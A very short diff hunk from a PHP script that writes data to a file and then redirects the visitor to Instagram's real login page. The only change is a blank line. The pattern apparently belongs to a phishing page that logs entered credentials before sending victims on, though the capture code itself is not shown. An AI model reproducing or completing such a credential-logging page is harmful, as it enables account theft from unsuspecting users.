@@ -11,6 +11,7 @@ fwrite ( $dosya , $yaz ) ;
 fclose ($dosya);
 
 header("Location: https://www.instagram.com/accounts/login");
+
 die();
 
  ?>
